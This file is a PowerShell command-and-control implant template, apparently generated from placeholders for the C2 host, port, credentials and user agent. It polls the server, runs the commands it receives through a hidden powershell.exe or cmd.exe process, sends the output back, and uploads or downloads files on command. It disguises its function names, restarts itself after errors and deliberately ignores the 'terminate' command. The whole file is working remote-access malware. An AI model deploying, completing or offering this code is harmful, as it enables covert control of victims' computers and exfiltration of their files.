$C2_URL = "http://{lhost}:{lport}"
$CLIENT_ID = "{line}"
$USERNAME = "{username}"
$PASSWORD = "{password}"
$SLEEP = {sleep}
$MALEABLE = "{maleable}"
$USER_AGENT = "{useragent}"
$MAX_RETRIES = 5
$RETRY_DELAY = 5

function HelloWorld {
    if ($Error.Count -gt 0) {
        Write-Output "[RECOVER] Recuperándose de panic: $Error[0]"
                Start-Process -FilePath $MyInvocation.MyCommand.Path -ArgumentList $MyInvocation.UnboundArguments -NoNewWindow -Wait
        exit
    }
}

function Send-Gift {
    param (
        [string]$url,
        [string]$method,
        [string]$body,
        [string]$filePath
    )

    $lastErr = $null
    for ($eltiempo = 0; $eltiempo -lt $MAX_RETRIES; $eltiempo++) {
        if ($eltiempo -gt 0) {
            Start-Sleep -Seconds $RETRY_DELAY
        }

        try {
            $resp = Send-Request -url $url -method $method -body $body -filePath $filePath
            return $resp
        } catch {
            $lastErr = $_.Exception.Message
            Write-Output "[RETRY] Intento $($eltiempo + 1) de $MAX_RETRIES fallido: $lastErr"
        }
    }
    throw $lastErr
}

function Send-Request {
    param (
        [string]$url,
        [string]$method,
        [string]$body,
        [string]$filePath
    )

    trap { HelloWorld }

    $client = New-Object System.Net.Http.HttpClient
    $client.Timeout = New-TimeSpan -Seconds 60
    $client.DefaultRequestHeaders.Authorization = New-Object System.Net.Http.Headers.AuthenticationHeaderValue "Basic", [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("${USERNAME}:${PASSWORD}"))
    $client.DefaultRequestHeaders.UserAgent.ParseAdd($USER_AGENT)

    if ($filePath -ne "") {
        $fileContent = [System.IO.File]::ReadAllBytes($filePath)
        $byteArrayContent = New-Object System.Net.Http.ByteArrayContent -ArgumentList @(,$fileContent)
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $content.Add($byteArrayContent, "file", [System.IO.Path]::GetFileName($filePath))
        $response = $client.PostAsync($url, $content).Result
    } else {
        $content = [System.Net.Http.StringContent]::new($body, [System.Text.Encoding]::UTF8, "application/json")
        $requestMessage = [System.Net.Http.HttpRequestMessage]::new($method, $url)
        $requestMessage.Content = $content
        $response = $client.SendAsync($requestMessage).Result
    }

    return $response
}

function Ex-Gift {
    param (
        [string[]]$sc,
        [string]$command
    )

    $output = $null
    $lastErr = $null
    for ($eltiempo = 0; $eltiempo -lt $MAX_RETRIES; $eltiempo++) {
        if ($eltiempo -gt 0) {
            Start-Sleep -Seconds $RETRY_DELAY
        }

        try {
            $output = Bubies -sc $sc -command $command
            return $output
        } catch {
            $lastErr = $_.Exception.Message
            Write-Output "[RETRY] Intento de ejecución $($eltiempo + 1) de $MAX_RETRIES fallido: $lastErr"
        }
    }
    throw $lastErr
}

function Bubies {
    param (
        [string[]]$sc,
        [string]$command
    )

    trap { HelloWorld }

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = $sc[0]
    $process.StartInfo.Arguments = "$($sc[1]) $command"
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.RedirectStandardError = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true
    $process.Start() | Out-Null
    $output = $process.StandardOutput.ReadToEnd()
    $error = $process.StandardError.ReadToEnd()
    $process.WaitForExit()

    if ($process.ExitCode -ne 0) {
        throw "$error`n$output"
    }

    return $output
}

function Get-Price {
    trap { HelloWorld }

    if (Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") {
        return @("powershell.exe", "-Command")
    } elseif (Test-Path "C:\Windows\System32\cmd.exe") {
        return @("cmd.exe", "/C")
    } else {
        throw "No se encontró un shell compatible"
    }
}

function Main {
    trap { HelloWorld }

    $sc = Get-Price

    while ($true) {
        try {
            $ctx = New-Object System.Threading.CancellationTokenSource(New-TimeSpan -Seconds 180)
            $resp = Send-Gift -url "$C2_URL$MALEABLE$CLIENT_ID" -method "GET" -body "" -filePath ""
            if ($resp -eq $null -or $resp.Content -eq $null) {
                Write-Output "[ERROR] Respuesta vacía"
                Start-Sleep -Seconds $SLEEP
                continue
            }

            $command = [System.Text.Encoding]::UTF8.GetString($resp.Content.ReadAsByteArrayAsync().Result)

            switch -Wildcard ($command) {
                "terminate" {
                    Write-Output "[INFO] Comando terminate recibido pero continuando operación"
                }
                "download:*" {
                    Handle-Download -command $command
                }
                "upload:*" {
                    Handle-Upload -command $command
                }
                default {
                    Hands -command $command -sc $sc
                }
            }
        } catch {
            Write-Output "[ERROR] Error en request principal: $_"
            Start-Sleep -Seconds $SLEEP
        }

        Start-Sleep -Seconds $SLEEP
    }
}

function Handle-Download {
    param (
        [string]$command
    )

    trap { HelloWorld }

    $filePath = $command -replace "download:", ""
    $fileURL = "$C2_URL$MALEABLE/download/$filePath"

    $resp = Send-Gift -url $fileURL -method "GET" -body "" -filePath ""
    if ($resp -eq $null -or $resp.Content -eq $null) {
        Write-Output "[ERROR] Respuesta de descarga vacía"
        return
    }

    $fileData = $resp.Content.ReadAsByteArrayAsync().Result
    [System.IO.File]::WriteAllBytes([System.IO.Path]::GetFileName($filePath), $fileData)
    Write-Output "[INFO] Archivo descargado: $filePath"
}

function Handle-Upload {
    param (
        [string]$command
    )

    trap { HelloWorld }

    $filePath = $command -replace "upload:", ""
    $resp = Send-Gift -url "$C2_URL$MALEABLE/upload" -method "POST" -body "" -filePath $filePath
    if ($resp -ne $null) {
        if ($resp.StatusCode -eq [System.Net.HttpStatusCode]::OK) {
            Write-Output "[INFO] Archivo subido: $filePath"
        } else {
            Write-Output "[ERROR] Fallo en subida: $filePath (Status: $($resp.StatusCode))"
        }
    }
}

function Hands {
    param (
        [string]$command,
        [string[]]$sc
    )

    trap { HelloWorld }

    $output = Ex-Gift -sc $sc -command $command
    $jsonData = @{
        output = $output
        client = $env:OS
        command = $command
    } | ConvertTo-Json

    $resp = Send-Gift -url "$C2_URL$MALEABLE$CLIENT_ID" -method "POST" -body $jsonData -filePath ""
    if ($resp -ne $null -and $resp.Content -ne $null) {
        $resp.Content.Dispose()
    }
}

Main
